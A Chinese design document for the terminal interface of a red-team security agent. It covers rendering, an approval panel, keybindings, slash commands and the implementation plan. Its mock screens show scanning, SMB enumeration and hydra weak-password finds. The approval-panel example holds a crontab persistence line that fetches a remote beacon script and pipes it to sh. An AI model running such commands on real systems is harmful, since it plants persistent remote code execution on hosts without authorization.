# tgsec 交互式 TUI 工程文档

状态：设计定稿（v2，视觉语言全面改仿 Claude Code），待实施。实施侧 Fedora/qoderclicn。
本文档与代码不一致时代码是错的——但实施前必须先读真实签名核对本文档的 API 形状，发现出入
以代码为准并回本文档勘误（房规：probe before assert）。行号引自 2026-10-27 Windows 侧勘察，
行号会持续漂移，引用前先核当前代码。

v2 修订说明：v1 的重框架面板语言（StatusBar 反色横条、单线框审批面板、右侧行动树栏）被用户
否决，定调**仿 Claude Code**。v2 的核心变化：① 主屏内联渲染取代 alt-screen 全屏——已完成的
对话**静态打印进终端 scrollback**（打印后永不重绘），只有当前回合 + 输入区是原地重绘的动态区；
② 对话流用 `⏺`/`⎿` 悬挂缩进标记，正文不着色、只有状态符号着色；③ 审批用圆角盒 + 编号选项；
④ 输入区圆角盒 + 单行 dim 状态行；⑤ 取消回合计窗，改为输出截断 + `ctrl+r` 展开。视觉风格
只借设计不复制代码（Claude Code 闭源；本仓 AGPL 姿态已定：自写实现）。

## 背景与目标

sec-agent 已有可跑的 TUI（`packages/sec-agent/src/tui/`，9 文件 2355 行，`tgsec` bin，
`TuiAltScreen` 全屏），但只是"能对话"的最低形态：

- **审批不可读**：guard 的 ask 只在 `AskBar` 一行黄底提示里出现（`status.ts`），操作者看不到
  工具参数、连接目标、命中规则——而 sec-guard 的 boundary 断言**禁止** TUI 直接读
  `TgSecRequest.arguments`（批1c 机械保障），必须先由批12a 在 sec-guard 侧新增"展示视图"出口。
- **长任务不可读**：`TranscriptView` 是无界追加线性列；红队长跑（数百工具调用）输出淹没屏幕。
- **子代理不可见**：`watchEvents` 是会话级订阅，task 工具 fork 的子会话不在事件流里。
- **队列不可见**：`SnapshotEvent.inbox` 与 `inbox_update` 事件被完全忽略。
- **重复投影**：TUI 与 sec-server 各自折叠同一事件流（TUI 留 delta 无图，server 有图丢 delta）。
- **errata G1**：T7d-3 名义完成但 WS abort 帧从未实现，ctrl+c abort 语义与 server 侧不对称。

目标：补成"可读、可控、可审"的作战终端，且**看起来、用起来像 Claude Code**——对话自然
留在终端滚动历史里，屏幕不被框架线占满，状态一目了然。

## 已定案约束遵从清单（实施中不得违反）

1. **房规命名**：新组件/类型/文档种类一律 `TgSec*`/`tg.sec.*`/`TG_SEC_*`；数据字面量不翻译。
2. **sec-guard boundary 不可破**：TUI 永远不 import `command-text.ts`、不读
   `TgSecRequest.arguments` 原文。审批面板显示的参数摘要**只能**来自批12a 新增的
   guard 展示视图（`TgSecDisplayView`，additive 出口，boundary.test.ts 白名单新增恰好一行）。
3. **四级模式与危险集语义不动**：TUI 只是 ask 通道的一个实现；`always` 不豁免危险集、
   硬 deny 不进人工通道——硬 deny 显示为红色终态行，**无申诉选项**。
4. **投影单一来源**：TUI 与 sec-server 共用同一份事件折叠（批12b 落在 sec-agent 包内、
   server 复用），不许第三份投影。
5. **durable day-one**：TUI 不持有内存态会话真相——重开 TUI 从 snapshot + 事件重放重建，
   静态重放只打印最终态，不重放中间 delta。
6. **攒批提交纪律**：每批复验绿后落本地 commit（不 push）。
7. **tg-tui 是 vendored 冻结面**：缺的能力在 sec-agent 侧组合实现，不改 `packages/tui` 源码。

## 总体架构

```
                    ┌───────────────────────────────┐
                    │  gibraltar harness (事件源)    │
                    │  watchEvents → AgentEvent ×22 │
                    └──────────────┬────────────────┘
                                   │
                    ┌──────────────▼────────────────┐
                    │  tg-sec-view (批12b, 新增)      │  ← 唯一事件折叠层
                    │  snapshot + delta → ViewModel   │     sec-server 复用
                    └──────────────┬────────────────┘
                                   │
        ┌──────────────────────────┼──────────────────────────┐
        │                          │                          │
┌───────▼───────┐        ┌─────────▼─────────┐      ┌─────────▼────────┐
│ TUI coordinator│        │ sec-server 投影    │      │ 将来: replay/导出 │
│ (TgSecTuiApp)  │        │ (WS 事件 + 图)     │      │                  │
└───────┬───────┘        └───────────────────┘      └──────────────────┘
        │
   controllers（构造期注入 host 接口，缺注入即 throw）：
   ├─ InputController      键位路由、editor 提交、shift+tab 模式循环
   ├─ TranscriptController 静态落盘 / 动态区重绘、输出截断、50ms 合并刷新
   ├─ ApprovalController   审批队列、编号选项面板、esc 拒绝、abort 行（errata G1）
   ├─ DialogController     modal 栈（models/connect/help/history）
   ├─ ActionTreeController 子会话 lazy 订阅、树 modal
   └─ ScreenController     主屏内联渲染、resize、光标管理、OSC 通知
```

**渲染模型（v2 核心）**：弃用 `TuiAltScreen` 默认路径，改 `TuiMainScreen` 内联：

- **静态区**：回合内每个块（用户消息、工具调用及其结果、assistant 正文、系统 note）在
  **定稿时**打印一次，此后永不重绘——终端 scrollback 天然就是作战记录，退出 TUI 后
  记录还在，v1 的"scrollback 回写"设计随之删除。
- **动态区**：屏幕底部一个原地重绘区域，自上而下 = 当前回合的流式块（spinner、进行中的
  工具调用、流式正文）→ 审批面板（有 ask 时）→ 输入盒 → 状态行。动态区高度随内容伸缩，
  每次重绘整体替换；定稿的块从动态区移除、追加进静态区。
- resize：静态区不重排（与 CC 一致，旧内容按打印时宽度留在历史里）；动态区按新宽度重绘。

## 屏幕布局

### 整体观感（主屏内联，非全屏）

```
$ tgsec --project nj-gov-2026

 tgsec v2.1.0 · 政务红蓝作战终端                          ← 欢迎块，accent 色仅此一处
 项目 nj-gov-2026 · 赛道 redteam · 模式 auto
 模型 anthropic/claude-sonnet-4 · scope: ~/.config/tgsec/…/scope.json
 /help 命令 · shift+tab 切模式 · esc 中断回合

> 帮我扫一下 10.20.0.0/24 的存活主机                        ← 用户消息：> 前缀 + dim

⏺ 先确认 scope 里有没有这个网段。                            ← thinking：dim 斜体感（仅 dim）

⏺ Bash(nmap -sn 10.20.0.0/24 -oN -)                       ← 工具调用：⏺ + 工具名(参数摘要)
  ⎿  8 hosts up, scan took 4.2s                            ← 结果：⎿ 悬挂缩进，dim
     … +214 lines (ctrl+r to expand)                       ← 截断提示：dim，可展开

⏺ 扫到 8 台存活主机，其中 10.20.0.17 开放 445/3389，建议先做 smb 枚举。  ← assistant 正文，默认色

╭────────────────────────────────────────────────────────╮  ← 输入盒：圆角，border dim
│ > ▏                                                    │
╰────────────────────────────────────────────────────────╯
  auto · nj-gov-2026 · claude-sonnet-4                        ← 状态行：单行 dim
```

与 v1 的关键差异：**没有** StatusBar 反色横条、**没有** 横贯屏幕的分隔线、**没有** 常驻
AskBar。屏幕绝大部分是默认前景色的对话正文，视觉重量只给状态符号。

### 标记语法（所有对话块的封闭集合）

| 标记 | 用途 | 颜色 |
| --- | --- | --- |
| `> ` | 用户消息前缀 | dim |
| `⏺ ` | 工具调用、assistant 正文、思考块的起始行 | 见下方状态着色 |
| `  ⎿  ` | 工具结果/续行的悬挂缩进（与 ⏺ 后文本对齐） | dim |
| `     `（5 空格） | ⎿ 之后的结果续行 | dim |
| `✳ ` | 动态区 spinner 行 | accent |
| `✗ ` | 硬 deny / error 终态行 | error |
| `▣ ` | 系统 note（模式切换、上下文重置等） | dim |

`⏺` 的状态着色：**done = success 绿**；**error = error 红**；**denied/aborted = warning 黄**；
进行中的工具调用在动态区，bullet 随 spinner 帧脉动（见 §动效）。静态落盘后所有 ⏺ 固定为
终态色。

### 工具结果截断

- 默认显示结果前 **5 行**（CC 习惯），超过则第 6 行打 `… +N lines (ctrl+r to expand)`。
- `ctrl+r` 展开最近一个截断块（在动态区展开为完整结果，esc 或再次 ctrl+r 收回到
  5 行形态）；展开态定稿进静态区时**仍按 5 行截断**落盘，全文在会话记录里（durable
  真相不在屏幕上）。
- 单行结果直接一行 `⎿  <text>`，无截断行。空结果打 `⎿  (no output)`。

### diff 型工具（edit/write）的结果形态

```
⏺ Update(packages/sec-guard/src/guard.ts)
  ⎿  12  - const mode = TG_SEC_DEFAULT_MODE;
        + const mode = resolveMode(config);
     13    ...
```

`-` 行 error 红、`+` 行 success 绿、上下文行 dim；行号右对齐占 4 列。超过 12 行同样
截断 + ctrl+r。

### 计划/待办块（plan 工具的渲染）

```
⏺ 行动计划
  ⎿  ☒ 存活扫描（10.20.0.0/24，8 台存活）
     ◐ smb 枚举（进行中）
     ☐ 凭据爆破（等 smb 结果）
```

`☒` 完成（dim）、`◐` 进行中（accent）、`☐` 待办（默认色）。计划更新时**不整树重打**——
只在动态区显示最新一版，定稿时打印一次。

## 审批面板（批12c）

有 ask 待决时，动态区在输入盒**上方**插入圆角面板；transcript 静态区不被遮挡。

```
╭────────────────────────────────────────────────────────╮
│ bash · 危险集 persistence.crontab-write · 强制人工        │ ← 标题行：warning 色，无底色
│                                                        │
│   crontab -e <<'EOF'                                   │ ← 命令预览：默认色，缩进 2
│   */5 * * * * curl http://10.20.0.99/beacon.sh | sh    │
│   EOF                                                  │
│                                                        │
│   连接目标 10.20.0.99 · scope: allow                     │ ← dim；未注册目标 warning 色
│                                                        │
│ ❯ 1. 允许一次                                           │ ← 选中行：accent 色 ❯ + 整行反显
│   2. 总是允许（此工具+此目标）                             │
│   3. 拒绝                                               │
│                                                        │
│   esc 拒绝 · ↑↓ 选择 · enter 确认 · 排队 2 条              │ ← 底行 dim
╰────────────────────────────────────────────────────────╯
╭────────────────────────────────────────────────────────╮
│ > ▏                                                    │
╰────────────────────────────────────────────────────────╯
```

逐元素规格：

- **边框**：圆角 `╭╮╰╯`，`border` 令牌（dim）。宽 = `min(72, 屏宽-4)`，左右留白不顶格。
  面板**无底色**——CC 的权限盒靠边框与留白分层，不靠底色块。
- **标题行**：工具名 + 命中规则 id + `强制人工`（仅 `decision.forced` 时），warning 色。
  普通 ask（非强制）标题只有工具名 + `需要审批`，默认色。
- **命令预览**：批12a 的 `TgSecDisplayView.commandPreview`（guard 侧已脱敏截断，TUI 不碰
  原始 arguments）。最多 6 行，超出尾行 `…`。
- **连接目标行**：`connectionTargets` 逐条，后缀 scope 判定（`allow` 默认色 / `deny` error /
  `未注册` warning）。多目标逐行。
- **选项列表**：编号 + 文案，↑↓ 移动 `❯`，enter 确认；数字键 `1/2/3` 直选（与 CC 一致）。
  **`always` 选项在 forced ask 时整行移除**（危险集不可豁免，渲染一个无效的键是欺骗），
  剩余选项重编号。esc = 拒绝（等价选项 3）。
- **排队**：`queued > 0` 时底行追加 `排队 N 条`；多条 ask 按序处理，不并列显示。
- **键盘所有权**：面板可见期间输入盒失焦（`>` 变 dim、光标隐去），全部键路由给面板。

### 硬 deny 与 abort 终态（errata G1 修复）

硬 deny 不进人工通道，动态区只出现一条 2 秒自动消失的终态行，同时落一条静态记录：

```
✗ bash 被硬 deny：self-protection.loopback · 目标 127.0.0.1 · 任何模式直接拒绝，无申诉
```

abort（esc 中断回合）：进行中的工具调用结果行改写为 `⎿  Interrupted by user`，
bullet 转 warning 色，spinner 行消失，输入盒恢复焦点。server 侧 WS abort 帧由批12c 同步补。

## 输入区与状态行（批12f）

```
╭────────────────────────────────────────────────────────╮
│ > nmap -sV 10.20.0.17▏                                 │
╰────────────────────────────────────────────────────────╯
  auto · nj-gov-2026 · claude-sonnet-4 · ⠋ 14s · ↑ 12.4k
```

- **输入盒**：圆角框，border dim；聚焦时 border 转 accent（极克制的唯一聚焦反馈）。
  高 = 内容行数 + 2，最小 3，最大 10（超出内部滚动）。placeholder dim：
  `输入消息，! 前缀直跑 bash，/ 命令`。
- **多行**：`shift+enter` 换行；粘贴含换行自动多行。>20 行或 >2KB 的粘贴折叠为
  `[paste · 23 lines]` chip，光标在 chip 上 `ctrl+x` 展开。
- **状态行**：输入盒下方一行 dim，左起 = 模式徽标 → project → model；busy 时右侧追加
  `⠋ <elapsed>s · ↑ <tokens>`（spinner 与耗时）。模式徽标着色分级：`strict` 默认色、
  `judge-auto` accent、`auto` warning、`yolo` **error 红 + `⚠` 前缀**——权限越宽视觉越警醒。
- **shift+tab 循环模式**：strict → judge-auto → auto → yolo → strict，每跳一次状态行即时
  更新 + 静态区落一条 `▣ 模式切换为 auto` note（审计 span 由 guard 侧既有机制落）。
- **bash 直通**：`!` 前缀直接走 bash 工具不进模型上下文（沿用现状 `run ` 前缀语义，
  批12f 统一为 `!`；`run ` 保留兼容一季后删）。
- **历史**：`↑/↓` 会话内历史（现状已有）；`ctrl+r` 已分配给输出展开，历史搜索 modal
  不做（未决项登记）。跨会话的历史列举与恢复入口已在 CLI 层提供（`tg-sec --history` /
  `--continue` / `--session`，P1-4），TUI 侧仍不做。
- **队列可见性**：busy 时提交走 `whenBusy: "followUp"` 进 inbox；排队的消息在动态区
  输入盒上方逐条 dim 显示 `> <text> (queued)`，回合开始消费时逐条移除并落静态区。
  数据源：`SnapshotEvent.inbox` + `inbox_update`（现状被忽略的两个免费出口）。

## `/` 指令（批12f）

输入 `/` 时输入盒**上方**弹出指令菜单（CC 式，不占整屏、不是 modal）：随输入实时过滤，
`↑↓` 选择、`tab`/`enter` 补全进输入盒、`esc` 关闭菜单并保留已输入文本。菜单条目 =
指令名（accent 色，左对齐宽 10）+ 一句话说明（dim），最多 8 条，超出内部滚动：

```
  /mode      查看或切换权限模式（strict|judge-auto|auto|yolo）
  /model     切换模型并记忆选择
  /models    按过滤词挑选已认证模型
╭────────────────────────────────────────────────────────╮
│ > /mo▏                                                 │
╰────────────────────────────────────────────────────────╯
  auto · nj-gov-2026 · claude-sonnet-4
```

未知指令提交后静态区落一条 warning 色 note：`▣ 未知指令 /foo；/help 列出全部指令`。

### 指令总表

| 指令 | 参数 | 行为 | busy 时 |
| --- | --- | --- | --- |
| `/help` | — | 帮助 modal（指令表 + 键位表） | 可用 |
| `/connect` | — | 登录 modal（OAuth / API key，现状 LoginDialog 收编） | 拒绝 |
| `/models` | `[query]` | 模型挑选 modal，带过滤词预填 | 拒绝 |
| `/model` | 无参 → 同 `/models` | 打开模型挑选 | 拒绝 |
| `/model` | `<provider/id>` | 直接切换并记忆选择；静态区落 `▣ 模型切换为 …` | 拒绝 |
| `/mode` | 无参 | 静态区落 `▣ 当前模式 auto（strict/judge-auto/auto/yolo）` | 可用 |
| `/mode` | `<name>` | 同 shift+tab 的目标态直达；非法值 error note | 可用（热切换，下一条工具调用起生效） |
| `/scope` | — | 静态区落 scope 配置路径 + 条目形状示例（现状文案保留） | 可用 |
| `/clear` | — | 重置上下文（保留屏幕对话）；落 `▣ 上下文已重置` | 拒绝 |
| `/compact` | `[text]` | 压缩上下文，可选引导语；落 `▣ 压缩完成 · 12.4k → 3.1k tokens` | 拒绝 |
| `/usage` | — | 用量 modal：input/output/cacheRead/total tokens + cost | 可用 |
| `/tree` | — | 同 `ctrl+t`，行动树 modal | 可用 |
| `/quit` `/exit` `/q` | — | 退出；有 busy 回合时先确认（二次输入才退出，防误触丢回合） | 二次确认 |

- **拒绝语义**：busy 时收到拒绝类指令，静态区落 warning note
  `▣ /model 在回合运行中不可用；等回合结束或 esc 中断`（与现状 `refuseWhileBusy` 一致）。
- **指令结果的去向**：短结果（mode/scope/模型切换确认）走静态区 `▣` note；长结果
  （help/usage/models/connect/tree）走 modal。指令**不进模型上下文**——只有用户消息进。
- **补全数据源封闭**：菜单条目来自指令表常量，不接受模型/工具动态注入；`!` bash 直通
  与 `/` 指令互斥（`!` 开头不弹指令菜单）。
- **二次确认**只用于 busy 时退出；idle 退出无确认。

## spinner 与流式（动态区）

```
✳ 运行中… (esc 中断 · 14s · ↑ 12.4k tokens)

⏺ Bash(nmap -sn 10.20.0.0/24)                            ← 进行中工具，bullet 脉动
  ⎿  Starting Nmap 7.94 …                                ← 流式结果，最多 5 行滚动
```

- spinner 行：`✳` 10 帧旋转（100ms/帧），文案固定 `运行中…`，括号内 esc 提示 + 耗时 +
  累计 tokens。不引入 CC 的花哨动词表——作战终端保持严肃。
- **50ms 合并刷新**：delta 事件进 pending 缓冲，50ms 合并一次重绘动态区（现状是每个事件
  一次 requestRender，流式时主线程被重绘打满）。
- 流式 assistant 正文：动态区纯文本，定稿时经 Markdown 渲染落静态区（代码块/列表/表格
  在静态区才是完整形态）。
- 同一时间**只有一处 spinner**（最上层活跃块），并发子代理用静态 `⏺` 不转。

## 子代理与行动树（批12e）

主对话里 task 工具就是普通工具行；子代理细节收进 modal，不占主屏：

```
⏺ Task(smb 枚举：10.20.0.17)
  ⎿  子会话完成 · 4 个工具调用 · 发现 2 个弱口令账户 (ctrl+t 查看行动树)
```

`ctrl+t` 打开行动树 modal（居中圆角盒，宽 `min(64, 屏宽-8)`）：

```
╭────────────────────────────────────────────────────────╮
│ 行动树 · root › nj-gov-2026                              │
│                                                        │
│ ▾ root · redteam                                       │
│   ├─ ✓ nmap 存活扫描（2m）                               │
│   ├─ ❯ smb 枚举 · 子会话                                │ ← 选中行反显
│   │    ├─ ✓ enum4linux                                 │
│   │    └─ ✓ hydra（2 个弱口令）                           │
│   └─ ○ 凭据爆破（排队中）                                 │
│                                                        │
│ ↑↓ 移动 · enter 展开/折叠 · esc 关闭                       │
╰────────────────────────────────────────────────────────╯
```

- 数据源：`tg.sec.action-tree` 文档族（`action-tree.ts` 已有），不新造存储。
- 节点符号：`✓` 完成 / `⠋` busy（整树只许一处转）/ `○` 排队 / `✗` 失败 / `⊘` 被拒。
- **lazy 订阅**：modal 关闭时子会话零订阅；打开时只对展开节点订阅，关闭即退订——
  红队长跑 fork 几十个子会话，全开订阅会打爆事件流。
- 不做 v1 的"跳进子会话切换 transcript"——主对话保持单一线程，子会话细节在 modal 内
  展开查看，降低心智负担。

## modal 系统（批12f 收编）

统一圆角盒规格：宽 `min(64, 屏宽-8)`，高 `min(内容, 屏高-6)`，标题行 accent 色，
底行 dim 键位提示，边框 border 色。同一时刻一层 modal，esc 关栈顶。

- `/models`：两行条目（`provider/model-id` + dim 的 `上下文 200k · 已认证`），↑↓ 选择。
- `/connect`：沿用现状 OAuth/API-key 流程与 masked 密钥输入，只收编进 modal 栈。
- `/help`、`/usage`：文本 modal。
- 行动树 modal：见上节。

## 色彩与主题令牌（批12g）

配色原则（CC 式克制）：**正文永远默认前景色**；颜色只给状态符号、模式徽标、diff、
选中行。欢迎块的 tgsec 标识是唯一一处大面积 accent。

| 令牌 | 默认映射 | 用途 |
| --- | --- | --- |
| `fg` | 终端默认前景 | 正文、参数摘要、命令预览 |
| `dim` | bright black (90) | 用户消息、工具结果、thinking、状态行、底行提示 |
| `accent` | orange (208) | 欢迎标识、spinner、选中行 ❯、聚焦边框、judge-auto 徽标 |
| `success` | green (32) | ⏺ done、`+` diff 行 |
| `warning` | yellow (33) | 审批标题、auto 徽标、denied/aborted ⏺ |
| `error` | red (31) | ✗ 硬 deny、`-` diff 行、yolo 徽标、error ⏺ |
| `border` | bright black (90) | 输入盒/审批盒/modal 边框 |

- 令牌集中在 `tui/theme.ts` 重写为 `tgSecTheme`；组件只许用令牌名。
- `NO_COLOR`/`TG_SEC_NO_COLOR`：全部退化为无色，符号语义不变（⏺/✗/☒ 仍在）。
- 不做 light/dark 双主题（作战终端几乎全 dark，不为假想需求做抽象）。
- CI guard（批12g）：`check:house-standard` 增源级断言——`packages/sec-agent/src/tui/**`
  禁止 `\x1b[` 字面量与裸色调用（theme.ts 白名单），仿 sec-guard boundary 元用例自带
  "检查器真会红"。

## 终端集成细节

- **主屏内联默认**（v2 变更）：默认 `TuiMainScreen`；`--alt` 或 `TG_SEC_ALT=1` 回退
  alt-screen（老习惯用户）。alt 模式保留静态/动态分区语义，退出时把静态区已打印内容
  重打一遍到主屏（仅此模式需要回写）。
- **OSC 通知**（批12g）：回合结束或 ask 待决且终端失焦时发 `OSC 9`（iTerm2/kitty/wezterm）：
  `tgsec: 回合完成（project）` / `tgsec: 等待审批（project）`。不支持的终端静默忽略。
  `TG_SEC_NOTIFY=off` 关闭。
- **剪贴板**：`ctrl+shift+c` 复制光标所在块全文（native clipboard，tg-tui 已具备）。
- **图片**：kitty 协议内联渲染截图类工具输出，不支持降级为 dim 文件路径行。
- **鼠标**：主屏内联模式下不接管鼠标——终端原生滚动/选区复制就是操作者的滚动与复制
  （与 CC 一致）。alt 模式下滚轮走 ScrollView。

## 窄终端降级矩阵

| 屏宽 | 行为 |
| --- | --- |
| ≥100 | 完整布局 |
| 72–99 | 输入盒/审批盒宽 = 屏宽-4；状态行省略 model 段 |
| 60–71 | 状态行只留模式徽标；审批命令预览 6→3 行；行动树 modal 全宽 |
| <60 或 <16 行 | 拒绝启动，打一行 `terminal too small (need ≥60×16)` 退出码 2 |

CJK：所有宽度计算走 tg-tui `visibleWidth`，截断 `truncateToWidth` 不切双宽字符；
⏺/⎿ 悬挂缩进按 `visibleWidth` 对齐。批12c/12e 测试含 CJK 工具名用例。

## 键位总表

| 键 | 上下文 | 动作 |
| --- | --- | --- |
| `enter` | 输入盒 | 提交 |
| `shift+enter` | 输入盒 | 换行 |
| `tab` | 输入盒 | 触发/确认补全 |
| `↑`/`↓` | 输入盒 | 历史 |
| `shift+tab` | 全局 | 循环权限模式（strict→judge-auto→auto→yolo） |
| `ctrl+r` | 全局 | 展开/收回最近截断的工具结果 |
| `ctrl+x` | 粘贴 chip 上 | 展开粘贴内容 |
| `ctrl+t` | 全局 | 行动树 modal |
| `ctrl+shift+c` | 全局 | 复制当前块全文 |
| `ctrl+l` | 全局 | 重绘动态区 |
| `esc` | busy | 中断当前回合 |
| `esc` | 审批面板 | 拒绝 |
| `esc` | modal | 关闭 |
| `esc` | 输入盒非空 | 清行 |
| `ctrl+c` | 审批面板 | 全部拒绝 |
| `ctrl+c` | busy | 同 esc 中断 |
| `ctrl+c` | idle | 退出 |
| `↑↓`/`enter`/`1-3` | 审批面板/modal | 选择/确认/直选 |

键位经 tg-tui KeybindingsManager 注册，键位表本身做快照测试。

## 性能工程

- **静态区零重绘**：定稿块只打印一次，这是最大的性能来源——200 回合的长会话中
  每帧重绘成本只与动态区高度有关，与会话长度无关。
- **50ms 合并刷新**：见 §spinner 与流式。
- **动态区渲染缓存**：按 `块id + 宽度` 缓存 render 结果，resize 全失效重建。
- **view-model 保留策略**：全量保留（文本量小），不做窗口修剪——v1 的回合计窗设计删除。
- **lazy 订阅**：行动树子会话订阅随 modal 开关。
- **bench**（批12d）：合成 200 回合 × 10 工具调用 × 流式 delta 灌入，断言重绘次数上界
  与单帧耗时上界，进 CI。

## 测试策略

- **view-model 单测**（批12b）：22 种 AgentEvent × snapshot 折叠金样本；与 sec-server
  投影同输入同输出一致性测试。
- **渲染快照**：每种块形态（工具五态、截断行、diff、计划块、审批普通/forced、硬 deny 行、
  行动树 modal、窄终端四档）golden render 断言到 ANSI 串。
- **boundary 元用例**：批12a 展示视图出口进白名单恰好一行；TUI 侧 CI guard 禁裸色/
  禁 import guard 内部件。
- **键位快照**：全量快照，改键即红。
- **faux 冒烟**：`--faux` 端到端覆盖 ask 应答、esc 中断、行动树 fork 可见、主屏内联
  静态落盘（断言已定稿块不重绘）。

## 批次计划

| 批 | 内容 | 验收 |
| --- | --- | --- |
| 12a | sec-guard 展示视图 `TgSecDisplayView`（additive，boundary 白名单 +1 行） | sec-guard 套件绿 + boundary 元用例红→绿 |
| 12b | `tg-sec-view` 事件折叠层，sec-server 切换复用 | 同输入同输出一致性测试绿 |
| 12c | 审批面板（编号选项）+ 硬 deny/abort 终态 + 队列显示（errata G1 关闭） | golden render + faux 冒烟过 ask 流程 |
| 12d | 主屏内联渲染：静态落盘/动态区分区 + 输出截断 + 50ms 合并 + bench | 静态区零重绘断言 + bench 上界绿 |
| 12e | 行动树 modal + lazy 订阅 | CJK 用例 + 订阅计数断言 |
| 12f | 输入收编（shift+tab 模式循环/粘贴 chip/`!` 前缀）+ `/` 指令菜单与指令总表落地 + modal 栈 + 状态行 | 键位快照 + 指令菜单过滤/补全用例 + 冒烟 |
| 12g | 主题令牌 + CI 裸色 guard + OSC 通知 | CI guard 元用例 + NO_COLOR 渲染用例 |

12a 是硬前置：没有展示视图，12c 的审批面板无合法数据源。12d 是渲染模型切换批，
在 12c 之后落地（先让审批面板在旧渲染下可用，再换底座，降低单批爆炸半径）。
每批复验绿即落本地 commit。

## 未决项

1. **主屏内联为默认**是 v2 新决策：若实测 tg-tui `TuiMainScreen` 的原地重绘在
   Windows Terminal/旧 conhost 上有兼容问题，回退 `--alt` 默认，本文档回改。
2. **清队列 API**：gibraltar 无 inbox 清空原语，排队消息只显示不可撤回。
3. **历史搜索 modal**：`ctrl+r` 已分配给输出展开，历史搜索暂不做，↑/↓ 兜底。跨会话的
   历史列举与恢复已由 CLI 层提供（`tg-sec --history` / `--continue` / `--session`，P1-4），
   TUI 选择器仍不做。
4. **OSC 通知串格式**：各终端方言不一，12g 按 wezterm/kitty 实测收敛。
